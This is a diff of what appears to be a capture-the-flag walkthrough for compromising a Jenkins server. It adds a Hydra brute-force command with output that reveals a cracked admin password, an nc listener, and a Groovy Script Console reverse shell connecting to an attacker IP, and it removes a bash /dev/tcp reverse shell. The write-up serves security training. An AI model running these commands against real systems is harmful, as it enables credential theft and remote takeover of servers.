@@ -364,7 +364,21 @@ build the hydra command.
 Hydra:
 
 ```text
-$ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP target> -s 8888 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 1234 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+```
+
+Results:
+
+```text
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-03 03:30:55
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://127.0.0.1:1234/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
+[STATUS] 418.00 tries/min, 418 tries in 00:01h, 14343981 to do in 571:56h, 16 active
+[1234][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-03 03:32:15
 ```
 
 Log in to Jenkins with the found username and password.
@@ -375,13 +389,14 @@ Start a listener:
 
     nc -nlvp 5555
 
-In Jenkins, go to "Jenkins > Nodes > master" and click on "Script Console". Enter (change the
-necessary parameters):
+In Jenkins, go to "Manage Jenkins > Nodes > master" and click on "Script Console". Enter (change the
+necessary parameters) this code from 
+[Abusing Jenkins Groovy Script Console to get Shell](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6):
 
 ```text
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP attack machine>/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
+String host="10.9.1.53";
+int port=5555;
+String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
 And execute. In the listener, we now have a reverse shell in docker. In `/opt` is a message 
